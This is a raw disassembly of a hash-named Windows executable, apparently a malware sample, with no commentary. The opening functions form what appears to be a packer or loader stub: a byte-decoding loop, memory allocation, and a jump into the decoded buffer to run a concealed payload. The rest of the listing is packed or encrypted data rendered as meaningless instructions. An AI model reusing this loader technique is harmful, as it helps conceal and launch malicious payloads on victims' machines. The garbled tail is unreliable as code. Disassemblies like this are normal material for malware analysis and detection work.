
0391a7024032362a321042da7b10bf4304d9970992f8649088cf942ec9e3b7e4.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0x8
  411003:	push   ebx
  411004:	push   ebp
  411005:	mov    ebp,DWORD PTR [esp+0x20]
  411009:	push   esi
  41100a:	xor    eax,eax
  41100c:	push   edi
  41100d:	mov    edi,DWORD PTR [esp+0x1c]
  411011:	mov    DWORD PTR [esp+0x10],eax
  411015:	mov    esi,0xfffffffd
  41101a:	mov    DWORD PTR [esp+0x14],0x1
  411022:	mov    ecx,DWORD PTR [esp+0x20]
  411026:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41102a:	add    esi,0x2
  41102d:	inc    esi
  41102e:	mov    BYTE PTR [esi+edi*1],cl
  411031:	movzx  ecx,BYTE PTR [eax+ebp*1]
  411035:	mov    edx,DWORD PTR [esp+0x10]
  411039:	mov    eax,DWORD PTR [esp+0x14]
  41103d:	add    edx,eax
  41103f:	mov    DWORD PTR [esp+0x10],edx
  411043:	ror    eax,cl
  411045:	mov    eax,DWORD PTR [esp+0x10]
  411049:	mov    edx,eax
  41104b:	shr    edx,0x3
  41104e:	mov    ebx,0x1
  411053:	sub    ebx,edx
  411055:	imul   eax,ebx
  411058:	mov    DWORD PTR [esp+0x10],eax
  41105c:	shl    ebx,0x3
  41105f:	mov    bl,BYTE PTR [esi+edi*1]
  411062:	add    bl,cl
  411064:	mov    ecx,DWORD PTR [esp+0x24]
  411068:	mov    BYTE PTR [esi+edi*1],bl
  41106b:	sub    esi,0x2
  41106e:	cmp    esi,ecx
  411070:	jl     0x411022
  411072:	pop    edi
  411073:	pop    esi
  411074:	pop    ebp
  411075:	pop    ebx
  411076:	add    esp,0x8
  411079:	ret    
  41107a:	nop
  41107b:	nop
  41107c:	nop
  41107d:	nop
  41107e:	nop
  41107f:	nop
  411080:	push   ebp
  411081:	mov    ebp,esp
  411083:	sub    esp,0x70
  411086:	mov    DWORD PTR [ebp-0x8],0x0
  41108d:	mov    DWORD PTR [ebp-0x70],0x0
  411094:	mov    DWORD PTR [ebp-0x58],0x0
  41109b:	mov    DWORD PTR [ebp-0x5c],0x0
  4110a2:	mov    DWORD PTR [ebp-0x48],0x0
  4110a9:	mov    DWORD PTR [ebp-0x6c],0x0
  4110b0:	mov    DWORD PTR [ebp-0x68],0x0
  4110b7:	mov    DWORD PTR [ebp-0x10],0x0
  4110be:	mov    DWORD PTR [ebp-0x60],0x0
  4110c5:	mov    DWORD PTR [ebp-0x18],0x0
  4110cc:	mov    DWORD PTR [ebp-0xc],0x0
  4110d3:	mov    DWORD PTR [ebp-0x30],0x0
  4110da:	mov    DWORD PTR [ebp-0x2c],0x0
  4110e1:	mov    DWORD PTR [ebp-0x14],0x0
  4110e8:	mov    DWORD PTR [ebp-0x4],0x0
  4110ef:	mov    DWORD PTR [ebp-0x54],0x0
  4110f6:	mov    DWORD PTR [ebp-0x50],0x0
  4110fd:	mov    DWORD PTR [ebp-0x4c],0x0
  411104:	mov    eax,ds:0x429160
  411109:	mov    DWORD PTR [ebp-0x28],eax
  41110c:	mov    ecx,DWORD PTR ds:0x429164
  411112:	mov    DWORD PTR [ebp-0x24],ecx
  411115:	mov    edx,DWORD PTR ds:0x429168
  41111b:	mov    DWORD PTR [ebp-0x20],edx
  41111e:	mov    al,ds:0x42916c
  411123:	mov    BYTE PTR [ebp-0x1c],al
  411126:	mov    ecx,DWORD PTR ds:0x429150
  41112c:	mov    DWORD PTR [ebp-0x40],ecx
  41112f:	mov    edx,DWORD PTR ds:0x429154
  411135:	mov    DWORD PTR [ebp-0x3c],edx
  411138:	mov    eax,ds:0x429158
  41113d:	mov    DWORD PTR [ebp-0x38],eax
  411140:	mov    cx,WORD PTR ds:0x42915c
  411147:	mov    WORD PTR [ebp-0x34],cx
  41114b:	mov    dl,BYTE PTR ds:0x42915e
  411151:	mov    BYTE PTR [ebp-0x32],dl
  411154:	mov    DWORD PTR [ebp-0x2c],0x40
  41115b:	call   DWORD PTR ds:0x42901c
  411161:	mov    eax,DWORD PTR [ebp-0x70]
  411164:	push   eax
  411165:	call   DWORD PTR ds:0x429018
  41116b:	lea    ecx,[ebp-0x10]
  41116e:	push   ecx
  41116f:	lea    edx,[ebp-0x18]
  411172:	push   edx
  411173:	call   DWORD PTR ds:0x429000
  411179:	test   eax,eax
  41117b:	jne    0x4111a5
  41117d:	push   0x0
  41117f:	push   0x14
  411181:	push   0x14
  411183:	push   0xa
  411185:	push   0xa
  411187:	push   0x0
  411189:	push   0x0
  41118b:	push   0x14
  41118d:	push   0x14
  41118f:	push   0xa
  411191:	push   0xa
  411193:	push   0x0
  411195:	push   0x0
  411197:	call   0x424352
  41119c:	mov    eax,DWORD PTR [ebp-0x10]
  41119f:	add    eax,0x1
  4111a2:	mov    DWORD PTR [ebp-0x10],eax
  4111a5:	mov    BYTE PTR [ebp-0x40],0x56
  4111a9:	call   DWORD PTR ds:0x429034
  4111af:	mov    DWORD PTR [ebp-0x30],eax
  4111b2:	mov    BYTE PTR [ebp-0x3e],0x72
  4111b6:	movzx  ecx,WORD PTR [ebp-0x30]
  4111ba:	test   ecx,ecx
  4111bc:	jne    0x411210
  4111be:	mov    BYTE PTR [ebp-0x34],0x0
  4111c2:	mov    DWORD PTR [ebp-0x18],0xe0d
  4111c9:	lea    edx,[ebp-0x28]
  4111cc:	push   edx
  4111cd:	call   DWORD PTR ds:0x429044
  4111d3:	mov    DWORD PTR [ebp-0x60],eax
  4111d6:	mov    DWORD PTR [ebp-0x50],0x3a
  4111dd:	lea    eax,[ebp-0x40]
  4111e0:	push   eax
  4111e1:	mov    ecx,DWORD PTR [ebp-0x60]
  4111e4:	push   ecx
  4111e5:	call   DWORD PTR ds:0x429048
  4111eb:	mov    DWORD PTR [ebp-0x44],eax
  4111ee:	mov    DWORD PTR [ebp-0x4],0xdcab1f3e
  4111f5:	push   0x0
  4111f7:	push   0x14
  4111f9:	push   0x14
  4111fb:	push   0xa
  4111fd:	push   0xa
  4111ff:	push   0x0
  411201:	call   DWORD PTR ds:0x42900c
  411207:	mov    DWORD PTR [ebp-0x6c],0x10ebff
  41120e:	jmp    0x411225
  411210:	mov    BYTE PTR ds:0x447ac8,0x0
  411217:	mov    BYTE PTR ds:0x42d6a0,0x0
  41121e:	mov    BYTE PTR ds:0x443dd8,0x0
  411225:	push   0x0
  411227:	call   DWORD PTR ds:0x429140
  41122d:	push   DWORD PTR ds:0x429044
  411233:	pop    edx
  411234:	mov    DWORD PTR [ebp-0x68],edx
  411237:	mov    edx,DWORD PTR [ebp-0x70]
  41123a:	push   edx
  41123b:	call   DWORD PTR ds:0x429050
  411241:	mov    DWORD PTR [ebp-0x30],0x410000
  411248:	push   DWORD PTR [ebp-0x2c]
  41124b:	push   0x1000
  411250:	mov    eax,DWORD PTR [ebp-0x18]
  411253:	add    eax,0x23
  411256:	add    eax,0x23
  411259:	push   eax
  41125a:	xor    eax,eax
  41125c:	push   eax
  41125d:	mov    ecx,DWORD PTR [ebp-0x44]
  411260:	call   ecx
  411262:	mov    edx,eax
  411264:	mov    DWORD PTR [ebp-0x8],edx
  411267:	mov    eax,DWORD PTR [ebp-0x6c]
  41126a:	sub    eax,0xdae0b
  41126f:	mov    DWORD PTR [ebp-0x6c],eax
  411272:	cmp    DWORD PTR [ebp-0x8],0x0
  411276:	jne    0x411286
  411278:	push   0x0
  41127a:	call   0x42434c
  41127f:	mov    BYTE PTR ds:0x443dd8,0x0
  411286:	mov    ecx,DWORD PTR [ebp-0x8]
  411289:	add    ecx,DWORD PTR [ebp-0x18]
  41128c:	mov    edx,DWORD PTR [ebp-0x4]
  41128f:	mov    DWORD PTR [ecx],edx
  411291:	mov    eax,DWORD PTR [ebp-0x8]
  411294:	add    eax,DWORD PTR [ebp-0x50]
  411297:	mov    DWORD PTR [ebp-0x5c],eax
  41129a:	mov    ecx,DWORD PTR ds:0x429048
  4112a0:	mov    DWORD PTR [ebp-0x4c],ecx
  4112a3:	mov    edx,DWORD PTR [ebp-0x8]
  4112a6:	add    edx,DWORD PTR [ebp-0x18]
  4112a9:	mov    eax,DWORD PTR [ebp+0x8]
  4112ac:	mov    DWORD PTR [edx+0x4],eax
  4112af:	mov    ecx,DWORD PTR [ebp-0x8]
  4112b2:	add    ecx,DWORD PTR [ebp-0x18]
  4112b5:	mov    DWORD PTR [ebp-0xc],ecx
  4112b8:	push   0x8000
  4112bd:	push   0x0
  4112bf:	mov    edx,DWORD PTR [ebp-0x70]
  4112c2:	push   edx
  4112c3:	call   DWORD PTR ds:0x42904c
  4112c9:	cmp    DWORD PTR [ebp-0x6c],0x0
  4112cd:	jbe    0x4112ea
  4112cf:	mov    eax,DWORD PTR [ebp-0xc]
  4112d2:	push   eax
  4112d3:	mov    ecx,DWORD PTR [ebp-0x18]
  4112d6:	push   ecx
  4112d7:	mov    edx,DWORD PTR [ebp-0x30]
  4112da:	add    edx,DWORD PTR [ebp-0x6c]
  4112dd:	push   edx
  4112de:	mov    eax,DWORD PTR [ebp-0x8]
  4112e1:	push   eax
  4112e2:	call   0x411000
  4112e7:	add    esp,0x10
  4112ea:	mov    ecx,DWORD PTR [ebp-0x70]
  4112ed:	push   ecx
  4112ee:	call   DWORD PTR ds:0x429144
  4112f4:	cmp    DWORD PTR [ebp-0x5c],0x0
  4112f8:	je     0x41130b
  4112fa:	push   DWORD PTR [ebp-0x4c]
  4112fd:	push   DWORD PTR [ebp-0x68]
  411300:	mov    edx,DWORD PTR [ebp-0x5c]
  411303:	push   eax
  411304:	jmp    edx
  411306:	jmp    0x422dee
  41130b:	mov    edx,DWORD PTR [ebp+0x8]
  41130e:	mov    DWORD PTR [ebp-0x14],edx
  411311:	push   0x0
  411313:	push   0x1
  411315:	mov    eax,DWORD PTR [ebp-0x60]
  411318:	push   eax
  411319:	call   DWORD PTR ds:0x429058
  41131f:	in     al,dx
  411320:	mov    bh,BYTE PTR [ecx+0x5]
  411323:	ins    BYTE PTR es:[edi],dx
  411324:	(bad)  
  411325:	gs in  al,0x4e
  411328:	lock push edx
  41132a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41132b:	imul   BYTE PTR [ebx+0x42]
  41132e:	jo     0x41132e
  411330:	cmp    eax,0x647f9dac
  411335:	cli    
  411336:	mov    dl,0xac
  411338:	jae    0x41132a
  41133a:	add    al,0xaa
  41133c:	jno    0x411303
  41133e:	ins    DWORD PTR es:[edi],dx
  41133f:	cmp    BYTE PTR [edi+0x3d365f1c],0x8c
  411346:	das    
  411347:	jne    0x4112cc
  411349:	rol    cl,cl
  41134b:	cmp    ah,bh
  41134d:	mov    eax,0xcf1f2f63
  411352:	(bad)  
  411353:	fld    TBYTE PTR [eax]
  411355:	enter  0xc39d,0xcc
  411359:	ds or  al,dl
  41135c:	into   
  41135d:	sub    DWORD PTR [ecx+0x53],edx
  411360:	shr    eax,cl
  411362:	cdq    
  411363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411364:	xor    ch,BYTE PTR [ebx]
  411366:	mov    eax,ds:0x3fcc9c08
  41136b:	mov    esp,0xca8047a9
  411370:	inc    ebx
  411371:	int3   
  411372:	and    eax,0x3d6b830
  411377:	mov    bl,0x51
  411379:	jg     0x41136b
  41137b:	inc    eax
  41137c:	adc    DWORD PTR [esi],ebx
  41137e:	adc    DWORD PTR [ebx+0x29],0xffffffa8
  411382:	pushf  
  411383:	and    DWORD PTR ds:0xdd7c29ef,esi
  411389:	and    DWORD PTR [ecx+0xe],ecx
  41138c:	adc    dl,BYTE PTR [ebx-0x1]
  41138f:	test   BYTE PTR [esp+esi*4],ah
  411392:	push   edx
  411393:	inc    edx
  411394:	inc    esi
  411395:	out    0xdc,eax
  411397:	jmp    0x4113e5
  411399:	test   DWORD PTR [esi+0x7ed520e3],ebp
  41139f:	mov    dh,0x9
  4113a1:	arpl   WORD PTR [ecx*8-0x6cb13c56],bp
  4113a8:	xchg   DWORD PTR [eax+eax*1],eax
  4113ab:	jecxz  0x411331
  4113ad:	(bad)  
  4113ae:	mov    bh,0x7d
  4113b0:	imul   edx,DWORD PTR [eax-0x30],0x5eef8dde
  4113b7:	inc    bx
  4113b9:	push   0x6f44146e
  4113be:	mov    ah,0xea
  4113c0:	push   ds
  4113c1:	mov    ah,0x79
  4113c3:	test   cl,ah
  4113c5:	dec    eax
  4113c6:	mov    esi,0xd2ab7997
  4113cb:	out    dx,eax
  4113cc:	mov    al,0x3b
  4113ce:	rcl    BYTE PTR [ecx+0x6b],1
  4113d1:	adc    BYTE PTR [edi-0x1a],ch
  4113d4:	sbb    edx,ecx
  4113d6:	dec    edi
  4113d7:	sub    DWORD PTR [ecx+0x10],0xffffffa7
  4113db:	jmp    0x411383
  4113dd:	mov    al,ds:0xf4d2465c
  4113e2:	mov    bh,0xc3
  4113e4:	inc    ecx
  4113e5:	test   BYTE PTR [ebx-0x32b179fe],bl
  4113eb:	cld    
  4113ec:	xlat   BYTE PTR ds:[ebx]
  4113ed:	arpl   WORD PTR ds:0xc8a9fd9d,sp
  4113f3:	push   edi
  4113f4:	imul   edi,DWORD PTR [eax],0x65e63e8c
  4113fa:	xor    al,0x6c
  4113fc:	and    DWORD PTR [esi],ecx
  4113fe:	mov    ecx,0x20972be5
  411403:	push   esp
  411404:	sbb    al,0x8f
  411406:	pushf  
  411407:	xlat   BYTE PTR ds:[ebx]
  411408:	dec    esp
  411409:	das    
  41140a:	mov    DWORD PTR [edi+eax*4],esp
  41140d:	cmc    
  41140e:	popa   
  41140f:	jecxz  0x41147c
  411411:	adc    BYTE PTR ds:0x67c34b,bl
  411417:	push   ebx
  411418:	pop    ecx
  411419:	in     eax,0x1c
  41141b:	jns    0x41145a
  41141d:	js     0x4113b7
  41141f:	inc    esi
  411420:	xchg   edx,eax
  411421:	mov    edi,0xf732c08b
  411426:	mov    ds:0xe3c7bbc4,eax
  41142b:	sub    edi,DWORD PTR [esi]
  41142d:	cmp    esi,DWORD PTR [edi+0x6e]
  411430:	dec    eax
  411431:	ds xchg eax,ebx
  411434:	adc    esp,ebp
  411436:	pop    ds
  411437:	mov    ah,0x15
  411439:	sub    dl,ah
  41143b:	ss mov si,cs
  41143f:	xchg   esi,eax
  411440:	dec    edi
  411441:	sub    edi,eax
  411443:	jae    0x41143b
  411445:	mov    ds:0xd60fd2d7,al
  41144a:	xchg   esi,eax
  41144b:	aas    
  41144c:	mov    edx,0x85b3cc4
  411451:	or     ebp,DWORD PTR [edi-0x78]
  411454:	(bad)  
  411455:	xor    BYTE PTR [eax],ch
  411457:	add    al,0x91
  411459:	mul    DWORD PTR [esi+0x7da0467e]
  41145f:	nop
  411460:	sub    ah,bl
  411462:	adc    bh,ah
  411464:	jb     0x4114d3
  411466:	cmp    al,0x58
  411468:	out    dx,eax
  411469:	cmp    al,0xc9
  41146b:	fnstenv [eax-0x3e]
  41146e:	aas    
  41146f:	xchg   ecx,eax
  411470:	push   ebp
  411471:	jl     0x411472
  411473:	sbb    esi,ebp
  411475:	out    dx,al
  411476:	mov    bl,0xee
  411478:	mov    DWORD PTR [edx],ebx
  41147a:	sbb    DWORD PTR [ecx-0x62],edx
  41147d:	jbe    0x4114f0
  41147f:	add    DWORD PTR ds:0x61b7b1b8,ecx
  411485:	sub    BYTE PTR [edi+0xb],al
  411488:	push   eax
  411489:	sbb    dh,bl
  41148b:	retf   
  41148c:	or     BYTE PTR [edi+0x1fc9ea8a],al
  411492:	les    esp,FWORD PTR [eax]
  411494:	and    edi,DWORD PTR [eax+0x4c9f88af]
  41149a:	xchg   edi,eax
  41149b:	xchg   DWORD PTR [ecx+0x7f8feb69],ebx
  4114a1:	cmc    
  4114a2:	xchg   ebp,eax
  4114a3:	mov    eax,ds:0x146fc65
  4114a8:	jno    0x4114da
  4114aa:	imul   BYTE PTR [edx]
  4114ac:	xlat   BYTE PTR ds:[ebx]
  4114ad:	adc    bh,BYTE PTR [eax+ebp*4+0x20b7885a]
  4114b4:	aaa    
  4114b5:	sbb    al,0xa8
  4114b7:	gs and edx,0x3f8c8261
  4114be:	mov    WORD PTR [edi+0x9205570],gs
  4114c4:	pop    DWORD PTR [ebx-0x8]
  4114c7:	push   cs
  4114c8:	scas   al,BYTE PTR es:[edi]
  4114c9:	xor    DWORD PTR [edx],eax
  4114cb:	pop    ebp
  4114cc:	and    bl,BYTE PTR [ebx+0x10]
  4114cf:	call   0x286:0x2d5cc20a
  4114d6:	push   0x4f
  4114d8:	xchg   esp,eax
  4114d9:	inc    esp
  4114da:	icebp  
  4114db:	scas   eax,DWORD PTR es:[edi]
  4114dc:	test   eax,0xfdc4e9ca
  4114e1:	push   ebx
  4114e2:	arpl   WORD PTR [esi],dx
  4114e4:	or     ch,al
  4114e6:	and    edi,esi
  4114e8:	cmp    DWORD PTR [ecx+esi*2-0x79],edi
  4114ec:	in     al,0x10
  4114ee:	jae    0x411546
  4114f0:	data16 and BYTE PTR [edx],0x3f
  4114f4:	adc    esp,DWORD PTR [eax+0xd]
  4114f7:	mov    ?,WORD PTR [eax+0x7f]
  4114fa:	pop    es
  4114fb:	mov    ebp,0x92e645fb
  411500:	jns    0x4114c2
  411502:	pop    esp
  411503:	std    
  411504:	cmp    al,BYTE PTR [ebx+0x72daee7c]
  41150a:	pop    es
  41150b:	pop    esp
  41150c:	hlt    
  41150d:	std    
  41150e:	cmp    al,0xa3
  411510:	and    ebx,DWORD PTR [ebp+0x7546469b]
  411516:	icebp  
  411517:	mov    WORD PTR [ecx],ss
  411519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41151a:	cmp    BYTE PTR [ecx],ch
  41151c:	mov    dh,0xd7
  41151e:	nop
  41151f:	mov    edi,0x25fdadd8
  411524:	mul    BYTE PTR [edx+0x399b61ef]
  41152a:	push   edi
  41152b:	cdq    
  41152c:	sar    bl,cl
  41152e:	sbb    dl,BYTE PTR [esi+ebp*8+0x53154f06]
  411535:	push   edi
  411536:	cli    
  411537:	sub    bl,BYTE PTR [edi-0x74aa9b7f]
  41153d:	popf   
  41153e:	call   0xf4bd6b4f
  411543:	mov    edi,0x8727cf2d
  411548:	xchg   ecx,eax
  411549:	mov    ebx,0xbe4f386b
  41154e:	in     al,0x52
  411550:	loop   0x4114f2
  411552:	sub    eax,DWORD PTR [ebx]
  411554:	jmp    0x4114ee
  411556:	jecxz  0x41155c
  411558:	int3   
  411559:	test   BYTE PTR [ebx-0x4e],dh
  41155c:	xor    ch,BYTE PTR [edx+0x4cb188a9]
  411562:	and    al,0x8e
  411564:	test   eax,0x69452c3f
  411569:	jae    0x4115c8
  41156b:	popa   
  41156c:	inc    ebx
  41156d:	inc    ecx
  41156e:	jecxz  0x411521
  411570:	(bad)  
  411571:	dec    ecx
  411572:	sub    ah,BYTE PTR [edi-0x61c661c5]
  411578:	adc    edi,DWORD PTR [esi]
  41157a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41157b:	xchg   esi,eax
  41157c:	je     0x411569
  41157e:	pop    ecx
  41157f:	mov    WORD PTR [esi],cs
  411581:	cmp    ebx,DWORD PTR [edi+0x4a]
  411584:	es (bad) 
  411586:	pop    ebx
  411587:	js     0x4115f0
  411589:	adc    eax,0x2a00f727
  41158e:	out    0x58,al
  411590:	pop    esp
  411591:	in     al,0x10
  411593:	xchg   DWORD PTR [ebp-0x56],ebx
  411596:	sbb    BYTE PTR [esi],dl
  411598:	in     eax,dx
  411599:	repnz cmp BYTE PTR [ebp-0x5cc92c1d],cl
  4115a0:	sbb    eax,0x746abe00
  4115a5:	dec    eax
  4115a6:	ror    DWORD PTR [esi],1
  4115a8:	mov    cl,0x87
  4115aa:	jmp    0x991b:0x8feddc21
  4115b1:	xchg   esi,eax
  4115b2:	or     eax,eax
  4115b4:	xchg   ebx,eax
  4115b5:	js     0x41156f
  4115b7:	hlt    
  4115b8:	test   ecx,0xa4890135
  4115be:	hlt    
  4115bf:	dec    ecx
  4115c0:	jnp    0x41161b
  4115c2:	js     0x95185541
  4115c8:	ss push edx
  4115ca:	pop    ebx
  4115cb:	dec    edi
  4115cc:	int3   
  4115cd:	cmp    BYTE PTR [edx+0x53716b59],al
  4115d3:	imul   edi,esi,0xffffffdb
  4115d6:	imul   esp,DWORD PTR [edx+0x64],0x51
  4115da:	pop    eax
  4115db:	sub    DWORD PTR [ebp+eax*8-0x38],esi
  4115df:	sahf   
  4115e0:	je     0x411651
  4115e2:	sar    DWORD PTR [bx+0x12e4],1
  4115e7:	int3   
  4115e8:	fnstsw WORD PTR [edi+0x57818c79]
  4115ee:	stos   DWORD PTR es:[edi],eax
  4115ef:	sbb    BYTE PTR [ebx-0x1],cl
  4115f2:	push   ebx
  4115f3:	sar    DWORD PTR [esi],cl
  4115f5:	xchg   dh,dh
  4115f7:	or     BYTE PTR [esi],ah
  4115f9:	pop    ds
  4115fa:	push   ds
  4115fb:	ins    BYTE PTR es:[edi],dx
  4115fc:	pusha  
  4115fd:	jnp    0x4115b3
  4115ff:	dec    edx
  411600:	jo     0x411613
  411602:	inc    esp
  411603:	mov    cl,0x2d
  411605:	neg    cl
  411607:	int    0xf2
  411609:	add    al,0x86
  41160b:	out    0x49,al
  41160d:	(bad)  
  41160e:	jnp    0x4115b6
  411610:	adc    BYTE PTR [ebp-0x13],0xf3
  411614:	push   cs
  411615:	inc    esp
  411616:	lock inc ebx
  411618:	jmp    0x68778ded
  41161d:	fldenv [edx+0x29a0979e]
  411623:	icebp  
  411624:	xor    DWORD PTR [eax+edx*2-0x35f8cf96],ecx
  41162b:	sbb    ah,dh
  41162d:	fsubp  st(1),st
  41162f:	and    eax,0xcda4c269
  411634:	cmc    
  411635:	aaa    
  411636:	jmp    0x4116ae
  411638:	cld    
  411639:	aam    0x30
  41163b:	inc    edx
  41163c:	add    BYTE PTR [ebp+0x6d],ah
  41163f:	ja     0x4115fc
  411641:	(bad)  
  411642:	pop    esi
  411643:	pop    ebp
  411644:	inc    ebx
  411645:	fdiv   QWORD PTR [esp+ebp*8]
  411648:	push   ds
  411649:	inc    esp
  41164a:	sub    al,0xdc
  41164c:	xchg   esi,eax
  41164d:	out    0x3a,al
  41164f:	fstp   QWORD PTR [esi-0x75ab41f4]
  411655:	pmuludq mm3,QWORD PTR [ecx]
  411658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411659:	cld    
  41165a:	xor    al,0x48
  41165c:	dec    esp
  41165d:	dec    ebx
  41165e:	sbb    bh,BYTE PTR [esi]
  411660:	jo     0x41162a
  411662:	jmp    0x75f1691
  411667:	inc    edi
  411668:	movntps XMMWORD PTR [ecx+0x6f66e6b5],xmm7
  41166f:	sub    esi,DWORD PTR [edi+ebx*8+0x59]
  411673:	inc    BYTE PTR [eax-0x30]
  411676:	and    BYTE PTR [ebp-0x36],al
  411679:	repnz sub eax,0x8787f89a
  41167f:	loope  0x41164d
  411681:	cmc    
  411682:	mov    eax,ds:0xcca15f83
  411687:	push   edx
  411688:	in     eax,0xe6
  41168a:	mov    esp,DWORD PTR [edi+0x53c8c18e]
  411690:	loope  0x411643
  411692:	jg     0x411639
  411694:	or     BYTE PTR [esi],ch
  411696:	stc    
  411697:	inc    esi
  411698:	push   eax
  411699:	ins    BYTE PTR es:[edi],dx
  41169a:	xchg   esi,eax
  41169b:	das    
  41169c:	add    BYTE PTR [eax],dh
  41169e:	fcmovb st,st(4)
  4116a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116a1:	push   ecx
  4116a2:	cmp    DWORD PTR [edx],ebp
  4116a4:	mov    al,0x24
  4116a6:	not    DWORD PTR [ebp+0x7a]
  4116a9:	sub    BYTE PTR [ebx-0x6f4bfefa],cl
  4116af:	out    dx,al
  4116b0:	xchg   edi,eax
  4116b1:	(bad)  
  4116b2:	aaa    
  4116b3:	and    eax,0xb8ac3fdb
  4116b8:	out    0x2b,eax
  4116ba:	nop
  4116bb:	popa   
  4116bc:	loopne 0x41172a
  4116be:	sbb    al,0xd9
  4116c0:	sub    bh,BYTE PTR [ecx-0x20daae1a]
  4116c6:	xchg   edi,eax
  4116c7:	pop    edx
  4116c8:	(bad)  
  4116c9:	je     0x411709
  4116cb:	outs   dx,BYTE PTR ds:[esi]
  4116cc:	xor    BYTE PTR [eax],dl
  4116ce:	fldlg2 
  4116d0:	xor    BYTE PTR [ebx-0x2],dh
  4116d3:	lods   al,BYTE PTR ds:[esi]
  4116d4:	adc    ecx,DWORD PTR [ebx+0x55]
  4116d7:	mov    WORD PTR [esi+0x1becacae],fs
  4116dd:	dec    edi
  4116de:	jecxz  0x411671
  4116e0:	add    bl,BYTE PTR [ebp+esi*1-0x6ea3ec7e]
  4116e7:	xchg   ebp,eax
  4116e8:	cs cs mov bl,0xf2
  4116ec:	mov    ds:0xce8d8e2e,eax
  4116f1:	sti    
  4116f2:	xor    eax,0xbd9ce9f8
  4116f7:	daa    
  4116f8:	outs   dx,BYTE PTR ds:[si]
  4116fa:	(bad)  
  4116fb:	call   0xd04bbaa9
  411700:	push   ecx
  411701:	push   ss
  411702:	gs rol al,cl
  411705:	mov    bh,dl
  411707:	fdiv   st(3),st
  41170a:	fstp   TBYTE PTR ds:0x517d23d7
  411710:	mov    ebp,0x1457cdde
  411715:	xor    edx,DWORD PTR [ebx-0x77da2b43]
  41171b:	test   BYTE PTR [edi],al
  41171d:	mov    DWORD PTR [edx+eax*4+0x2db48b11],esp
  411724:	leave  
  411725:	jmp    0x411795
  411727:	jg     0x411744
  411729:	sbb    BYTE PTR ds:0x2e1552a0,ch
  41172f:	popa   
  411730:	adc    esi,DWORD PTR [esi+eax*8]
  411733:	and    eax,0x6402a163
  411738:	jbe    0x411774
  41173a:	and    ch,dh
  41173c:	(bad)  
  41173d:	push   eax
  41173e:	xchg   BYTE PTR [ecx],ah
  411740:	pop    ds
  411741:	fxch   st(6)
  411743:	cmp    bh,bl
  411745:	pushf  
  411746:	xor    BYTE PTR [ecx+0x55],dl
  411749:	jmp    0x411750
  41174b:	push   0xf4cf1ebb
  411750:	jnp    0x411728
  411752:	sub    BYTE PTR [edi+0x6bfc1ea2],0x94
  411759:	fldenv [esp+edx*8-0x3fdfb627]
  411760:	loopne 0x4117e0
  411762:	jge    0x4116ee
  411764:	pop    es
  411765:	pop    esp
  411766:	fisttp DWORD PTR [edi+ebp*2]
  411769:	xchg   DWORD PTR ds:[edx+ebp*4+0xf46f4a8],edx
  411771:	mov    bh,0x2c
  411773:	dec    ebp
  411774:	mov    BYTE PTR [edx+0x11],al
  411777:	mov    eax,0x4884d25f
  41177c:	xchg   edx,eax
  41177d:	mov    es,WORD PTR [ebp-0x3f1bfd53]
  411783:	fisub  WORD PTR [ebp-0x4f97b767]
  411789:	dec    ecx
  41178a:	sar    DWORD PTR ds:0xe51c50dc,0xe2
  411791:	das    
  411792:	push   esi
  411793:	cli    
  411794:	data16 mov cl,0x1f
  411797:	jo     0x4117b0
  411799:	dec    edx
  41179a:	xor    al,0x1d
  41179c:	push   es
  41179d:	cwde   
  41179e:	(bad)  
  41179f:	js     0x41173d
  4117a1:	ss ins DWORD PTR es:[edi],dx
  4117a3:	dec    ebx
  4117a4:	sbb    al,0x92
  4117a6:	cdq    
  4117a7:	cs fwait
  4117a9:	push   eax
  4117aa:	call   0x5452:0x737a2da2
  4117b1:	push   ds
  4117b2:	and    BYTE PTR [ecx+esi*2+0x31],cl
  4117b6:	pop    ss
  4117b7:	add    cl,BYTE PTR [ebp+0x3e]
  4117ba:	mov    ds:0x111eee38,al
  4117bf:	data16 loop 0x411770
  4117c2:	es loop 0x4117ae
  4117c5:	mov    ebx,0xdecb1dd1
  4117ca:	xor    al,0x77
  4117cc:	adc    ebp,ebp
  4117ce:	adc    BYTE PTR [edi],dh
  4117d0:	mov    al,BYTE PTR [edx-0x36f2ed1f]
  4117d6:	outs   dx,DWORD PTR ds:[esi]
  4117d7:	aas    
  4117d8:	ins    DWORD PTR es:[edi],dx
  4117d9:	fistp  QWORD PTR [edi+ecx*2-0x6225d82a]
  4117e0:	jg     0x4117ff
  4117e2:	jecxz  0x41185d
  4117e4:	clc    
  4117e5:	sbb    al,0x5d
  4117e7:	(bad)  
  4117e8:	xlat   BYTE PTR ds:[ebx]
  4117e9:	js     0x411862
  4117eb:	adc    eax,0xe9b47e45
  4117f0:	aaa    
  4117f1:	cld    
  4117f2:	push   esi
  4117f3:	mov    ebx,0x89038734
  4117f8:	call   0xd7a70392
  4117fd:	div    DWORD PTR [ebp+0x42]
  411800:	xor    BYTE PTR [esi],0x86
  411803:	push   0x3b
  411805:	push   cs
  411806:	lods   al,BYTE PTR ds:[esi]
  411807:	and    dh,bl
  411809:	lods   al,BYTE PTR ds:[esi]
  41180a:	rcr    DWORD PTR ds:0xcdb4910f,0x19
  411811:	mov    al,ds:0x49e50247
  411816:	fld    DWORD PTR [esi-0x4369e49c]
  41181c:	mov    edx,0xcf2ec744
  411821:	fcom   QWORD PTR [ebx-0xf]
  411824:	mov    ah,0x87
  411826:	add    dh,BYTE PTR [edi-0x3a]
  411829:	inc    esi
  41182a:	pop    edi
  41182b:	dec    ebp
  41182c:	scas   al,BYTE PTR es:[edi]
  41182d:	outs   dx,BYTE PTR ds:[esi]
  41182e:	iret   
  41182f:	push   ebp
  411830:	xchg   ebx,eax
  411831:	lods   al,BYTE PTR ds:[esi]
  411832:	imul   esi,ebx,0x374ee9b7
  411838:	fwait
  411839:	push   cs
  41183a:	dec    ecx
  41183b:	scas   al,BYTE PTR es:[edi]
  41183c:	adc    BYTE PTR [edi+0x19],dh
  41183f:	cmovae esp,DWORD PTR [ebx]
  411842:	cmp    bl,dh
  411844:	add    esi,esp
  411846:	mov    edx,0x3a2486d6
